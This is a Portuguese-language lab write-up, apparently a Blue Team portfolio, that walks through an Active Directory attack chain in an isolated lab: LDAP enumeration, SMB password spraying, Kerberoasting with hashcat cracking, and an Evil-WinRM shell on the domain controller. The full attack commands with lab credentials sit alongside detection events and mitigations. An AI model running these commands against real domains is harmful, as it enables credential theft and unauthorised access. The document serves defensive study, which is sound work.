# Lab: Protocolos-Alvo — SMB, RDP, LDAP, Kerberos e WinRM

> **Categoria:** Active Directory Security | Lateral Movement | Credential Attacks  
> **Nível:** Blue Team Jr. / SOC Analyst  
> **Ambiente:** VirtualBox — Windows Server 2022 (DC) + Kali Linux  
> **Ferramentas:** ldapdomaindump, NetExec, Impacket, Hashcat, Evil-WinRM, Wireshark  

---

## 🎯 Objetivo

Simular o ciclo completo de um ataque a um ambiente Active Directory utilizando os cinco protocolos mais abusados em ataques reais — do reconhecimento inicial ao acesso remoto ao Domain Controller — e documentar as evidências forenses geradas em cada fase.

---

## 🏗️ Ambiente

| Máquina | SO | IP | Função |
|---|---|---|---|
| DC | Windows Server 2022 | 172.16.0.1 | Domain Controller (mydomain.com) |
| Kali | Kali Linux | 172.16.0.101 | Máquina de ataque |

**Rede:** Internal Network isolada (VirtualBox), sem exposição externa.

---

## 🗺️ Kill Chain do Lab

```
LDAP Enum (reconhecimento)
      ↓
Password Spray SMB (acesso a credenciais em massa)
      ↓
Kerberoasting (extração de hash de conta de serviço)
      ↓
Hashcat (crack offline)
      ↓
Evil-WinRM (acesso remoto ao DC)
```

---

## Fase 1 — Reconhecimento via LDAP

**Protocolo:** LDAP (TCP 389)  
**Ferramenta:** `ldapsearch`, `ldapdomaindump`  
**MITRE:** T1087.002 — Account Discovery: Domain Account

### 1.1 Teste de Anonymous Bind

Primeiro passo: verificar se o AD aceita consultas sem autenticação (null session).

```bash
ldapsearch -x -H ldap://172.16.0.1 -b "dc=mydomain,dc=com" -s base
```

**Resultado:** `Operations error — a successful bind must be completed` → anonymous bind **bloqueado**. Controle de segurança funcionando.



### 1.2 Enumeração Autenticada

Com uma credencial de baixo privilégio obtida anteriormente, o atacante extrai o mapa completo do domínio:

```bash
ldapdomaindump -u 'mydomain.com\sqlservice' -p 'MinhaSenhaFraca123!' 172.16.0.1
```

**Resultado:** dump completo com 1005 usuários, grupos, computadores, política de senhas e SPNs.


### 1.3 LDAP Simple Bind — Senha em Texto Plano

Demonstração da diferença entre autenticação NTLM/SASL (segura) e simple bind (vulnerável):

```bash
ldapsearch -x -H ldap://172.16.0.1 -D "sqlservice@mydomain.com" -w 'MinhaSenhaFraca123!' -b "dc=mydomain,dc=com" -s base
```

A flag `-x` força **simple bind**, que trafega a senha em texto plano na porta 389. Capturado no Wireshark em `authentication: simple`.


> **Lição Blue Team:** LDAP sem TLS expõe credenciais em texto claro na rede. Exigir LDAPS (porta 636) ou SASL elimina esse vetor.

---

## Fase 2 — Password Spray via SMB

**Protocolo:** SMB (TCP 445)  
**Ferramenta:** NetExec  
**MITRE:** T1110.003 — Brute Force: Password Spraying

### Por que spray e não brute force?

Brute force clássico (muitas senhas, um usuário) dispara lockout de conta. Password spray (uma senha, muitos usuários) evita o bloqueio, pois cada conta recebe apenas uma tentativa por rodada.

### Execução

Lista de 1005 usuários extraída diretamente do dump LDAP da Fase 1:

```bash
tail -n +2 ~/lab-ldap-dump/domain_users.grep | cut -f1 > ~/users.txt
netexec smb 172.16.0.1 -u ~/users.txt -p 'Password1' --continue-on-success
```

**Resultado:** aproximadamente 1000 contas comprometidas com a senha `Password1`. O `SQLService` falhou (`STATUS_LOGON_FAILURE`) porque foi criado com senha diferente — confirmando que o ataque está testando corretamente.


### Detecção — Event Viewer

**Event ID 4625** (falha de logon) gerado em alto volume em segundos — anomalia comportamental clara.  
**Event ID 4624 Logon Type 3** (logon de rede via SMB) em massa no mesmo intervalo.


> **Nota:** o lockout de uma conta com senha diferente foi observado durante o ataque, confirmando que a Account Lockout Policy do AD estava ativa — controle de segurança funcionando como segunda camada de defesa.

---

## Fase 3 — Kerberoasting

**Protocolo:** Kerberos (TCP/UDP 88)  
**Ferramentas:** Impacket (`GetUserSPNs.py`), Hashcat  
**MITRE:** T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting

### Como funciona

Qualquer usuário autenticado no domínio pode solicitar um Service Ticket (TGS) para qualquer conta com SPN registrado. O ticket é criptografado com o hash da senha da conta de serviço. O atacante extrai esse ticket e tenta crackear offline — sem gerar alertas adicionais após a solicitação.

### Alvo

Conta criada para simular um SQL Server com senha não-trivial:

```powershell
New-ADUser -Name "SQLService" -SamAccountName "sqlservice" ...
setspn -A MSSQLSvc/dc01.mydomain.com:1433 sqlservice
```

### Extração do hash

```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
  mydomain.com/mbodin:Password1 -dc-ip 172.16.0.1 -request
```

Resultado: hash `$krb5tgs$23$*sqlservice$MYDOMAIN.COM$...` — formato Kerberos 5 TGS-REP etype 23 (RC4).


### Crack offline com Hashcat

```bash
hashcat -m 13100 ~/sqlservice.hash /usr/share/wordlists/rockyou.txt
# Não encontrado no rockyou — atacante usa wordlist customizada
hashcat -m 13100 ~/sqlservice.hash ~/wordlist_custom.txt --show
```

**Resultado:** `$krb5tgs$23$...:MinhaSenhaFraca123!` — senha da conta de serviço recuperada offline.


### Detecção — Event ID 4769

**Indicadores no evento:**
- `Account Name: mbodin@MYDOMAIN.COM` — conta de baixo privilégio solicitando ticket de serviço
- `Service Name: sqlservice` — alvo
- `Ticket Encryption Type: 0x17` — RC4, algoritmo fraco; tráfego legítimo usa `0x12` (AES256)
- `Client Address: ::ffff:172.16.0.101` — IP do atacante

> **Regra de detecção:** Event 4769 com `EncryptionType = 0x17` e `ServiceName != krbtgt` é altamente suspeito em ambientes modernos onde AES é o padrão.

---

## Fase 4 — Lateral Movement via WinRM

**Protocolo:** WinRM (TCP 5985)  
**Ferramenta:** Evil-WinRM  
**MITRE:** T1021.006 — Remote Services: Windows Remote Management

### Contexto

Com a senha da `sqlservice` crackeada na Fase 3, o atacante abre um shell remoto no DC usando Evil-WinRM — ferramenta que usa WinRM como transporte, suportando autenticação por senha ou hash NTLM.

```bash
evil-winrm -i 172.16.0.1 -u sqlservice -p 'MinhaSenhaFraca123!'
```

**Resultado:** shell PowerShell interativo no DC como `mydomain\sqlservice`.

```powershell
*Evil-WinRM* PS C:\> whoami
mydomain\sqlservice

*Evil-WinRM* PS C:\> hostname
DC
```


### Detecção — Event ID 4624

**Indicadores no evento:**
- `Account Name: sqlservice` — conta de serviço fazendo logon interativo (anomalia)
- `Logon Type: 3` — logon de rede (WinRM)
- `Authentication Package: NTLM V2`
- `Elevated Token: Yes` — sessão com privilégios elevados no DC


---

## 🔍 Resumo das Detecções

| Event ID | O que detecta | Fase | Severidade |
|---|---|---|---|
| 4625 (volume) | Password spray / brute force | 2 | 🔴 Alto |
| 4624 Type 3 (volume) | Logons SMB em massa | 2 | 🔴 Alto |
| 4769 EncType 0x17 | Kerberoasting | 3 | 🔴 Alto |
| 4624 Type 3 (sqlservice) | Lateral movement WinRM | 4 | 🔴 Alto |
| 4740 | Lockout de conta (spray detectado) | 2 | 🟡 Médio |

---

##  Mitigações Recomendadas

**LDAP**
- Exigir LDAPS (porta 636) ou signing/sealing para todas as conexões LDAP
- Monitorar Event ID 1644 para queries LDAP anômalas em volume

**SMB**
- Habilitar SMB Signing em todo o domínio (previne SMB Relay)
- Desabilitar SMBv1 (já feito no Windows Server 2022 por padrão)
- Política de senhas forte + MFA onde possível

**Kerberos**
- Contas de serviço devem ter senhas longas (+25 caracteres) e aleatórias
- Usar Group Managed Service Accounts (gMSA) — rotação automática de senha
- Monitorar Event 4769 com EncryptionType 0x17 em produção

**WinRM**
- Restringir acesso WinRM por GPO (apenas IPs de gerenciamento autorizados)
- Usar HTTPS (porta 5986) com certificado válido
- Contas de serviço não devem ter acesso a Remote Management Users

---

## MITRE ATT&CK

| Técnica | ID | Fase |
|---|---|---|
| Account Discovery: Domain Account | T1087.002 | Reconhecimento |
| Brute Force: Password Spraying | T1110.003 | Acesso inicial |
| Steal or Forge Kerberos Tickets: Kerberoasting | T1558.003 | Escalada |
| Remote Services: Windows Remote Management | T1021.006 | Movimento lateral |
| Network Sniffing | T1040 | Reconhecimento (LDAP plaintext) |

---

##  Ferramentas Utilizadas

| Ferramenta | Uso |
|---|---|
| ldapsearch / ldapdomaindump | Enumeração LDAP |
| Wireshark | Captura de tráfego (LDAP plaintext, SMB) |
| NetExec | Password spray SMB |
| Impacket (GetUserSPNs.py) | Kerberoasting |
| Hashcat | Crack offline de hash Kerberos (modo 13100) |
| Evil-WinRM | Lateral movement via WinRM |
| Windows Event Viewer | Detecção e análise forense |

---

*Lab executado em ambiente isolado para fins educacionais e de portfólio Blue Team.*
